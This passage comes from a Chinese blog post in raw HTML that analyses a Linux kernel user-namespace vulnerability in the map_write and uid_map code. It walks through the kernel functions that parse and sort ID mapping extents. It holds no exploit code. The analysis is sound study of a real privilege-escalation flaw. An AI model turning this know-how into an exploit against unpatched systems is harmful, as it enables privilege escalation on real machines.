     &lt;span&gt;if&lt;/span&gt; (new_map.nr_extents &amp;lt;=&lt;span&gt; UID_GID_MAP_MAX_BASE_EXTENTS) {
         memcpy(map&lt;/span&gt;-&amp;gt;extent, new_map.extent,
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;只是调换了几行代码的位置，先不着急，分析一下这个函数。&lt;/p&gt;
&lt;p&gt;在understand中，找出这个函数的调用流程图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1184911/201905/1184911-20190506102834970-641415892.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后去看看调用map_write的函数proc_uid_map_write，函数原型：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
ssize_t proc_uid_map_write(&lt;span&gt;struct&lt;/span&gt; file *file, &lt;span&gt;const&lt;/span&gt; &lt;span&gt;char&lt;/span&gt; __user *&lt;span&gt;buf,
               size_t size, loff_t &lt;/span&gt;*ppos)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参数很像文件描述符的写操作函数，在寻找源码中和该函数相关的操作，发现在fs/proc/base.c之中有这样一个结构用到了proc_uid_map_write：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; file_operations proc_uid_map_operations =&lt;span&gt; {
    .open        &lt;/span&gt;=&lt;span&gt; proc_uid_map_open,
    .write        &lt;/span&gt;=&lt;span&gt; proc_uid_map_write,
    .read        &lt;/span&gt;=&lt;span&gt; seq_read,
    .llseek        &lt;/span&gt;=&lt;span&gt; seq_lseek,
    .release    &lt;/span&gt;=&lt;span&gt; proc_id_map_release,
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;确认是文件的操作，接着在这个文件中，还有下面的代码&lt;/p&gt;
&lt;div class=&quot;line number2 index1 alt1&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
REG(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;uid_map&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,    S_IRUGO|S_IWUSR, proc_uid_map_operations)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;所以，推测这就是&lt;strong&gt; &lt;/strong&gt;/proc/&amp;lt;pid&amp;gt;/uid_map文件写操作的实现&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;接着回到漏洞源代码，开始分析，先从proc_uid_map_write函数开始，也就是文件写操作的第一个函数&lt;/p&gt;
&lt;div class=&quot;line number2 index1 alt1&quot; readability=&quot;70&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
ssize_t proc_uid_map_write(&lt;span&gt;struct&lt;/span&gt; file *file, &lt;span&gt;const&lt;/span&gt; &lt;span&gt;char&lt;/span&gt; __user *&lt;span&gt;buf,
               size_t size, loff_t &lt;/span&gt;*&lt;span&gt;ppos)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; seq_file *seq = file-&amp;gt;&lt;span&gt;private_data;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; user_namespace *ns = seq-&amp;gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; user_namespace *seq_ns =&lt;span&gt; seq_user_ns(seq);

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!ns-&amp;gt;&lt;span&gt;parent)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; -&lt;span&gt;EPERM;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ((seq_ns != ns) &amp;amp;&amp;amp; (seq_ns != ns-&amp;gt;&lt;span&gt;parent))
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; -&lt;span&gt;EPERM;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; map_write(file, buf, size, ppos, CAP_SETUID,
             &lt;/span&gt;&amp;amp;ns-&amp;gt;uid_map, &amp;amp;ns-&amp;gt;parent-&amp;gt;&lt;span&gt;uid_map);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;看到只是做了两个检查，然后调用了map_write函数，而map_write函数的后两个参数分别为名称空间的uid_map和父名称空间的uid_map（由名称空间的知识可以知道，名称空间的新建是需要clone处新进程，传入特定参数来创建新的名称空间）&lt;/p&gt;
&lt;p&gt;看看这些个map的定义，看到uid_gid_extent的定义正好是符合&lt;strong&gt; &lt;/strong&gt;/proc/&amp;lt;pid&amp;gt;/uid_map等的文件格式，而且在user_naspace的man手册中写道，这些文件一次能写入多个值，在Linux中4.14之前，这个极限被(任意地)设为5行。从Linux 4.15，限制是340行。这样下面这两个结构就不难理解了，当数据行数在5之内的时候，直接写在extent里面，当大于5的时候，放在forward指向的位置：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;p&gt;#define UID_GID_MAP_MAX_BASE_EXTENTS 5&lt;br/&gt;#define UID_GID_MAP_MAX_EXTENTS 340&lt;/p&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; uid_gid_extent {
    u32 first;
    u32 lower_first;
    u32 count;
};

&lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; uid_gid_map { &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; 64 bytes -- 1 cache line &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    u32 nr_extents;
    union {
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; uid_gid_extent extent[UID_GID_MAP_MAX_BASE_EXTENTS];
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; uid_gid_extent *&lt;span&gt;forward;
            &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; uid_gid_extent *&lt;span&gt;reverse;
        };
    };
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 看map_write的源码的第一部分，比较好理解了，capacity相关的含义对照man手册中的解释，除去几个参数判断的位置，比较重要的就是kbuf这块内存，调用了memdup_user_nul函数先在内核中分配了一块内存，然后将用户态写入的数据复制到内核之中，最后这块内存由kbuf指向&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;struct&lt;/span&gt; seq_file *seq = file-&amp;gt;&lt;span&gt;private_data;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; user_namespace *ns = seq-&amp;gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; uid_gid_map new_map;
    unsigned idx;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; uid_gid_extent extent;
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *kbuf = NULL, *pos, *&lt;span&gt;next_line;
    ssize_t ret &lt;/span&gt;= -&lt;span&gt;EINVAL;
    memset(&lt;/span&gt;&amp;amp;new_map, &lt;span&gt;0&lt;/span&gt;, &lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; uid_gid_map));

    ret &lt;/span&gt;= -&lt;span&gt;EPERM;
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Only allow one successful write to the map &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (map-&amp;gt;nr_extents != &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;
     * Adjusting namespace settings requires capabilities on the target.
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (cap_valid(cap_setid) &amp;amp;&amp;amp; !&lt;span&gt;file_ns_capable(file, ns, CAP_SYS_ADMIN))
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Only allow &amp;lt; page size writes at the beginning of the file &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    ret &lt;/span&gt;= -&lt;span&gt;EINVAL;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ((*ppos != &lt;span&gt;0&lt;/span&gt;) || (count &amp;gt;=&lt;span&gt; PAGE_SIZE))
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Slurp in the user data &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;从用户空间复制写入的数据到kbuf&lt;/span&gt;
    kbuf =&lt;span&gt; memdup_user_nul(buf, count);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (IS_ERR(kbuf)) {
        ret &lt;/span&gt;=&lt;span&gt; PTR_ERR(kbuf);
        kbuf &lt;/span&gt;=&lt;span&gt; NULL;
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Parse the user data &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    ret &lt;/span&gt;= -&lt;span&gt;EINVAL;
    pos &lt;/span&gt;= kbuf;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;接着看，有一个大循环，不断的按行解析出用户输入数据，存放进extent中，然后调用了两个比较关键的函数，mappings_overlap和insert_extent，mappings_overlap用来检测uid_gid_extent和uid_gid_map有没有重叠的部分，有返回true，insert_extent用来向uid_gid_map中插入一个uid_gid_extent。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;for&lt;/span&gt; (; pos; pos =&lt;span&gt; next_line) {

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Find the end of line and ensure I don't look past it &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        next_line &lt;/span&gt;= strchr(pos, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;\n&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (next_line) {
            &lt;/span&gt;*next_line = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;\0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
            next_line&lt;/span&gt;++&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (*next_line == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;\0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
                next_line &lt;/span&gt;=&lt;span&gt; NULL;
        }

        pos &lt;/span&gt;=&lt;span&gt; skip_spaces(pos);
        extent.first &lt;/span&gt;= simple_strtoul(pos, &amp;amp;pos, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!isspace(*&lt;span&gt;pos))
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

        pos &lt;/span&gt;=&lt;span&gt; skip_spaces(pos);
        extent.lower_first &lt;/span&gt;= simple_strtoul(pos, &amp;amp;pos, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!isspace(*&lt;span&gt;pos))
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

        pos &lt;/span&gt;=&lt;span&gt; skip_spaces(pos);
        extent.count &lt;/span&gt;= simple_strtoul(pos, &amp;amp;pos, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (*pos &amp;amp;&amp;amp; !isspace(*&lt;span&gt;pos))
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Verify there is not trailing junk on the line &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        pos &lt;/span&gt;=&lt;span&gt; skip_spaces(pos);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (*pos != &lt;span&gt;'&lt;/span&gt;&lt;span&gt;\0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Verify we have been given valid starting values &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; ((extent.first == (u32) -&lt;span&gt;1&lt;/span&gt;) ||&lt;span&gt;
            (extent.lower_first &lt;/span&gt;== (u32) -&lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Verify count is not zero and does not cause the
         * extent to wrap
         &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; ((extent.first + extent.count) &amp;lt;=&lt;span&gt; extent.first)
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ((extent.lower_first + extent.count) &amp;lt;=&lt;span&gt;
             extent.lower_first)
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Do the ranges in extent overlap any previous extents? &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (mappings_overlap(&amp;amp;new_map, &amp;amp;&lt;span&gt;extent))
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ((new_map.nr_extents + &lt;span&gt;1&lt;/span&gt;) == UID_GID_MAP_MAX_EXTENTS &amp;amp;&amp;amp;&lt;span&gt;
            (next_line &lt;/span&gt;!=&lt;span&gt; NULL))
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

        ret &lt;/span&gt;= insert_extent(&amp;amp;new_map, &amp;amp;&lt;span&gt;extent);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ret &amp;lt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;
        ret &lt;/span&gt;= -&lt;span&gt;EINVAL;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;看看这上面说到的两个关键函数的实现，mappings_overlap函数中，遍历uid_gid_map，取出每个uid_gid_extent，然后和extent进行比较，包括区间的上界和下届，同时可以看到当nr_extent大于5的时候，会指向forword指向的uid_gid_extent&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; mappings_overlap(&lt;span&gt;struct&lt;/span&gt; uid_gid_map *&lt;span&gt;new_map,
                 &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; uid_gid_extent *&lt;span&gt;extent)
{
    u32 upper_first, lower_first, upper_last, lower_last;
    unsigned idx;

    upper_first &lt;/span&gt;= extent-&amp;gt;&lt;span&gt;first;
    lower_first &lt;/span&gt;= extent-&amp;gt;&lt;span&gt;lower_first;
    upper_last &lt;/span&gt;= upper_first + extent-&amp;gt;count - &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    lower_last &lt;/span&gt;= lower_first + extent-&amp;gt;count - &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (idx = &lt;span&gt;0&lt;/span&gt;; idx &amp;lt; new_map-&amp;gt;nr_extents; idx++&lt;span&gt;) {
        u32 prev_upper_first, prev_lower_first;
        u32 prev_upper_last, prev_lower_last;
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; uid_gid_extent *&lt;span&gt;prev;

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (new_map-&amp;gt;nr_extents &amp;lt;=&lt;span&gt; UID_GID_MAP_MAX_BASE_EXTENTS)
            prev &lt;/span&gt;= &amp;amp;new_map-&amp;gt;&lt;span&gt;extent[idx];
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            prev &lt;/span&gt;= &amp;amp;new_map-&amp;gt;&lt;span&gt;forward[idx];

        prev_upper_first &lt;/span&gt;= prev-&amp;gt;&lt;span&gt;first;
        prev_lower_first &lt;/span&gt;= prev-&amp;gt;&lt;span&gt;lower_first;
        prev_upper_last &lt;/span&gt;= prev_upper_first + prev-&amp;gt;count - &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
        prev_lower_last &lt;/span&gt;= prev_lower_first + prev-&amp;gt;count - &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Does the upper range intersect a previous extent? &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; ((prev_upper_first &amp;lt;= upper_last) &amp;amp;&amp;amp;&lt;span&gt;
            (prev_upper_last &lt;/span&gt;&amp;gt;=&lt;span&gt; upper_first))
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Does the lower range intersect a previous extent? &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; ((prev_lower_first &amp;lt;= lower_last) &amp;amp;&amp;amp;&lt;span&gt;
            (prev_lower_last &lt;/span&gt;&amp;gt;=&lt;span&gt; lower_first))
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;好了，接着看insert_extent函数，可以看出一个大的if条件，当插入操作进行到末尾的时候，会分配一块340的内存，然后将拷贝的目的地址设置为forward指向的位置，接着nr_extent增加&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; insert_extent(&lt;span&gt;struct&lt;/span&gt; uid_gid_map *map, &lt;span&gt;struct&lt;/span&gt; uid_gid_extent *&lt;span&gt;extent)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; uid_gid_extent *&lt;span&gt;dest;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (map-&amp;gt;nr_extents ==&lt;span&gt; UID_GID_MAP_MAX_BASE_EXTENTS) {
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; uid_gid_extent *&lt;span&gt;forward;

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Allocate memory for 340 mappings. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        forward &lt;/span&gt;= kmalloc(&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt; uid_gid_extent) *&lt;span&gt;
                 UID_GID_MAP_MAX_EXTENTS, GFP_KERNEL);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;forward)
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; -&lt;span&gt;ENOMEM;

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Copy over memory. Only set up memory for the forward pointer.
         * Defer the memory setup for the reverse pointer.
         &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        memcpy(forward, map&lt;/span&gt;-&amp;gt;&lt;span&gt;extent,
               map&lt;/span&gt;-&amp;gt;nr_extents * &lt;span&gt;sizeof&lt;/span&gt;(map-&amp;gt;extent[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]));

        map&lt;/span&gt;-&amp;gt;forward =&lt;span&gt; forward;
        map&lt;/span&gt;-&amp;gt;reverse =&lt;span&gt; NULL;
    }

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (map-&amp;gt;nr_extents &amp;lt;&lt;span&gt; UID_GID_MAP_MAX_BASE_EXTENTS)
        dest &lt;/span&gt;= &amp;amp;map-&amp;gt;extent[map-&amp;gt;&lt;span&gt;nr_extents];
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        dest &lt;/span&gt;= &amp;amp;map-&amp;gt;forward[map-&amp;gt;&lt;span&gt;nr_extents];

    &lt;/span&gt;*dest = *&lt;span&gt;extent;
    map&lt;/span&gt;-&amp;gt;nr_extents++&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;下面回到map_write函数，之前的操作都是用来复制输入数据，做一些检查工作，最终的输入数据被放在了new_map中，new_idmap_permitted就不看了，可以对照usernamespaces的capacity来进行理解，接下来的函数是sort_idmaps函数&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;line number2 index1 alt1&quot; readability=&quot;92&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;if&lt;/span&gt; (new_map.nr_extents == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

    ret &lt;/span&gt;= -&lt;span&gt;EPERM;
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Validate the user is allowed to use user id's mapped to. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (!new_idmap_permitted(file, ns, cap_setid, &amp;amp;&lt;span&gt;new_map))
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

    ret &lt;/span&gt;= sort_idmaps(&amp;amp;&lt;span&gt;new_map);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ret &amp;lt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;sort_idmaps函数，这是一个排序函数，并且只有当只排序大于5的部分，同时kmemdup函数还复制了一份，进行了你想排序，将结果放在reverse处，从上面的函数能考到这个值被初始化为NULL&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; sort_idmaps(&lt;span&gt;struct&lt;/span&gt; uid_gid_map *&lt;span&gt;map)
{
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (map-&amp;gt;nr_extents &amp;lt;=&lt;span&gt; UID_GID_MAP_MAX_BASE_EXTENTS)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Sort forward array. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    sort(map&lt;/span&gt;-&amp;gt;forward, map-&amp;gt;nr_extents, &lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; uid_gid_extent),
         cmp_extents_forward, NULL);

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Only copy the memory from forward we actually need. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    map&lt;/span&gt;-&amp;gt;reverse = kmemdup(map-&amp;gt;&lt;span&gt;forward,
                   map&lt;/span&gt;-&amp;gt;nr_extents * &lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; uid_gid_extent),
                   GFP_KERNEL);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!map-&amp;gt;&lt;span&gt;reverse)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; -&lt;span&gt;ENOMEM;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Sort reverse array. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    sort(map&lt;/span&gt;-&amp;gt;reverse, map-&amp;gt;nr_extents, &lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; uid_gid_extent),
         cmp_extents_reverse, NULL);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后从map_write函数，遍历了输入数据，调用了map_id_range_down函数，这个函数的参数1是map_write接受的参数表示父名称空间的uid_gid_map，参数23表示写入数据的第23项，也就是映射父名称空间的其实位置和范围&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Map the lower ids from the parent user namespace to the
     * kernel global id space.
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (idx = &lt;span&gt;0&lt;/span&gt;; idx &amp;lt; new_map.nr_extents; idx++&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; uid_gid_extent *&lt;span&gt;e;
        u32 lower_first;

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (new_map.nr_extents &amp;lt;=&lt;span&gt; UID_GID_MAP_MAX_BASE_EXTENTS)
            e &lt;/span&gt;= &amp;amp;&lt;span&gt;new_map.extent[idx];
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            e &lt;/span&gt;= &amp;amp;&lt;span&gt;new_map.forward[idx];

        lower_first &lt;/span&gt;=&lt;span&gt; map_id_range_down(parent_map,
                        e&lt;/span&gt;-&amp;gt;&lt;span&gt;lower_first,
                        e&lt;/span&gt;-&amp;gt;&lt;span&gt;count);

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Fail if we can not map the specified extent to
         * the kernel global id space.
         &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (lower_first == (u32) -&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

        e&lt;/span&gt;-&amp;gt;lower_first =&lt;span&gt; lower_first;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;好，接着看map_id_range_down&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; u32 map_id_range_down(&lt;span&gt;struct&lt;/span&gt; uid_gid_map *&lt;span&gt;map, u32 id, u32 count)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; uid_gid_extent *&lt;span&gt;extent;
    unsigned extents &lt;/span&gt;= map-&amp;gt;&lt;span&gt;nr_extents;
    smp_rmb();

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (extents &amp;lt;=&lt;span&gt; UID_GID_MAP_MAX_BASE_EXTENTS)
        extent &lt;/span&gt;=&lt;span&gt; map_id_range_down_base(extents, map, id, count);
